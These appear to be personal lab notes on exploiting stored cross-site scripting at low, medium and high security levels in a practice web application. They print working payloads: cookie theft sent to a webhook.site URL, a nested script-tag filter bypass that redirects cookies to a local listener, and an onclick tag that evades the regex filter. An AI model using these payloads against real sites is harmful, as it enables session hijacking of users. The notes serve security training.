It's actually a very flexible vulnerability and can be used to chain other issues together.
Stored cross site scripting is much more powerful and the payload is stored in a database and than retrieved later.

Set up containers for our testing and this allows us to have multiple sessions open and test across different user accounts.

Mentor uses it for testing authorization issues:
to see if we can update Bob's account using Alice's session token.

But here will check if the CSS is indeed stored and not just showing up for the same user that post the payload.

Search Firefox containers
https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/

<h2>Objective</h2>
Redirect everyone to a web page of your choosing.

Webhooksite
```
https://webhook.site/0dc98dcb-0415-4fe1-abe8-11d6783e3f2e
```

>[!important] Security is Set to Low

Will Fire up the BurpSuite
command: 
```
<h1>Test</h1>
```
we do have html injection here and it worked
![[Pasted image 20231011192222.png]]


```
<script>prompt(1)</script>
```
Now let's prompt the cookie and than send it the webhook
```
<script>prompt(document.cookie)</script>
```
We are able to get the cookie so now we can send it to our site.
![[Pasted image 20231011192702.png]]


```
<script>var i = new Image; i.src="https://webhook.site/0dc98dcb-0415-4fe1-abe8-11d6783e3f2e?"+document.cookie;</script>
```
We have some kind of character limit so we can use dev tool or burp suite will go with dev tool for now. Increased the limit from 50 to 250
![[Pasted image 20231011193112.png]]
![[Pasted image 20231011193127.png]]


>[!important] Let's now change the level to medium and will see if any check are being happening now:

After testing everything in both the fields when i go through the code and got to know that
the checks happening in name and message are different as in the name field they are not checking the starting tag and replacing it but the things are different in the message field.

So i decided to go with the name tag at the moment.
```
<scr<script>ipt>prompt(1)</script>
```
![[Pasted image 20231011194916.png]]

Got the prompt and now will simply redirect it but this time i will host the server and send the request there.
```
<scr<script>ipt>window.location="http://127.0.0.1:4444/?"+document.cookie;</script>
```
![[Pasted image 20231011195628.png]]
It get's redirected 


>[!important] Let's change the level to High

I have done testing but it's regex and we can't beat it so we should simply play along with it. But i am saying is that is checking script tag will simply use another tag
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
![[Pasted image 20231011203322.png]]
```
<a onclick="alert(1)" style=display:block>test</a>
```
![[Pasted image 20231011203432.png]]
yes it's working now will redirect the website


```
<a href="http://127.0.0.1:4445/?cookie="+document.cookie" onclick="location.href" style=display:block>test</a>
```
![[Pasted image 20231011204531.png]]

![[Pasted image 20231011204437.png]]


Resources:
https://www.youtube.com/watch?v=P1I9UGpGdrU
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet